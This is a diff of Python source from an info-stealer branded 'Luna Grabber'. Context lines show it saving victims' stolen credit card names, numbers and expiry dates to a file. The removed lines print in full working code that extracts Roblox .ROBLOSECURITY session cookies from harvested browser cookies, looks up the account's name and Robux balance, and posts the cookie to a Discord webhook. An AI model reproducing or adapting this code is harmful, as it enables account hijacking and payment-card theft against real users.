@@ -3,7 +3,6 @@ import json
 import os
 import psutil
 import random
-import requests
 import sqlite3
 import threading
 from Cryptodome.Cipher import AES
@@ -194,74 +193,6 @@ class Browsers:
 				f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
 		cursor.close()
 		conn.close()
-
-	def roblox_cookies(self):
-		if not __CONFIG__["roblox"]:
-			pass
-		else:
-			robo_cookie_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")
-			robo_cookie = ""
-			with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
-				with open(robo_cookie_file, 'w', encoding="utf-8") as f:
-					for line in g:
-						if ".ROBLOSECURITY" in line:
-							robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
-							f.write(robo_cookie + "\n\n")
-					if os.path.getsize(robo_cookie_file) == 0:
-						f.write("No Roblox Cookies Found")
-						
-	def robloxinfo(self, webhook):
-		if __CONFIG__["roblox"]:
-			with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
-				robo_cookie = f.read().strip()
-				if robo_cookie == "No Roblox Cookies Found":
-					pass
-				else:
-					headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-					info = None
-					try:
-						response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
-						response.raise_for_status()
-						info = response.json()
-					except requests.exceptions.HTTPError:
-						pass
-					except requests.exceptions.RequestException:
-						pass
-					if info is not None:
-						data = {
-							"embeds": [
-								{
-									"title": "Roblox Info",
-									"color": 5639644,
-									"fields": [
-										{
-											"name": "<:roblox_icon:1041819334969937931> Name:",
-											"value": f"`{info['UserName']}`",
-											"inline": True
-										},
-										{
-											"name": "<:robux_coin:1041813572407283842> Robux:",
-											"value": f"`{info['RobuxBalance']}`",
-											"inline": True
-										},
-										{
-											"name": ":cookie: Cookie:",
-											"value": f"`{robo_cookie}`"
-										}
-									],
-									"thumbnail": {
-										"url": info['ThumbnailUrl']
-									},
-									"footer": {
-										"text": "Luna Grabber | Created By Smug"
-									},
-								}
-							],
-							"username": "Luna",
-							"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-						}
-						requests.post(webhook, json=data)
-						
 
 def create_temp(_dir: Union[str, os.PathLike] = None):
 	if _dir is None:
